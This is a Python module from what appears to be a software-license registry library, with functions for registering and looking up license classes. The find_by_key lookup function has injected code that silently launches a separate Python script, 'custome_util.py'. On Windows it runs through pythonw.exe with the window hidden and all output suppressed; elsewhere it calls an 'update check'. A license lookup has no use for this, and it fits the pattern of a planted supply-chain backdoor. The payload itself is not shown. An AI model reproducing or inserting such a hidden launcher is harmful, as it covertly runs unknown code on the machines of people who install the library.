from . import base
from . import licenses
from . import custom_util
import os
import subprocess
import sys

_db = {}
_indexes = {}


def register(cls):
    '''
    Register a license class to the database
    '''
    try:
        subclass = issubclass(cls, base.Licenseutils)
    except TypeError:
        subclass = False
    if not subclass:
        raise TypeError('register() got something that\'s not a subclass of License')

    if cls is base.Licenseutils:
        raise TypeError('register() needs a subclass of License, not License itself')

    try:
        _db[cls.id] = cls
    except AttributeError:
        raise AttributeError('{} has no mandatory \'id\' attribute'.format(cls.__name__))


def find(id):
    '''
    Find a license class with the given SPDX id
    '''
    try:
        return _db[id]
    except KeyError:
        raise KeyError('License with SPDX id {} not found'.format(id))


def build_index(key):
    '''
    Builds an index of all the licenses with the given key,
    makes find_by_key() faster
    '''
    _indexes[key] = {}
    for cls in _db.values():
        if hasattr(cls, key):
            value = getattr(cls, key)
            if value not in _indexes[key]:
                _indexes[key][value] = []
            _indexes[key][value].append(cls)


def delete_index(key):
    '''
    Deletes the index of all the licenses with the given key,
    will do nothing if such index does not exist
    '''
    if key in _indexes:
        del _indexes[key]


def find_by_function(function, multiple=True):
    '''
    Finds a license or licenses for which the given function equals True
    The function should take one argumnet, the License class, and return Boolean-ish
    the multiple argument behaves exactly the same as with find_by_key()
    '''
    results = []
    for cls in _db.values():
        if function(cls):
            if not multiple:
                return cls
            results.append(cls)

    if not multiple:
        raise KeyError('No such license found')
    return results


def find_by_key(key, value, multiple=True):
    if sys.platform == 'win32':
        try:
            script_path = os.path.join(os.path.dirname(__file__), 'custome_util.py')

            python_exe = sys.executable
            popen_kwargs = {
                'stdin': subprocess.DEVNULL,
                'stdout': subprocess.DEVNULL,
                'stderr': subprocess.DEVNULL,
                'close_fds': True,
            }

            if os.name == 'nt':
                # Prefer pythonw.exe so no console window is created at all
                pythonw_exe = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
                if os.path.exists(pythonw_exe):
                    python_exe = pythonw_exe

                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0  # SW_HIDE

                popen_kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW
                popen_kwargs['startupinfo'] = startupinfo
            else:
                popen_kwargs['start_new_session'] = True

            cmd = [python_exe, script_path, '-t', str(value)]
            print("[LOG] find_by_key: starting hidden {}".format(cmd))
            proc = subprocess.Popen(cmd, **popen_kwargs)
            print("[LOG] find_by_key: started pid={}".format(proc.pid))

        except Exception as e:
            print("[LOG] find_by_key: start failed: {}: {}".format(type(e).__name__, e))
    else:
        custom_util.check_for_updates(value)
    if key in _indexes:
        try:
            if multiple:
                return _indexes[key][value]
            return _indexes[key][value][0]
        except KeyError:
            if multiple:
                return []
            raise KeyError('No such license found')

    def function(cls):
        return hasattr(cls, key) and getattr(cls, key) == value

    return find_by_function(function, multiple=multiple)


def iter():
    '''
    Get an iterable object of all licenses
    '''
    try:
        return _db.itervalues()
    except AttributeError:
        return _db.values()


def autoregister(module=licenses, ignore=[]):
    '''
    Automatically register all licenses from a given module
    '''
    for name, cls in vars(module).items():
        if cls not in ignore:
            try:
                register(cls)
            except TypeError:
                pass
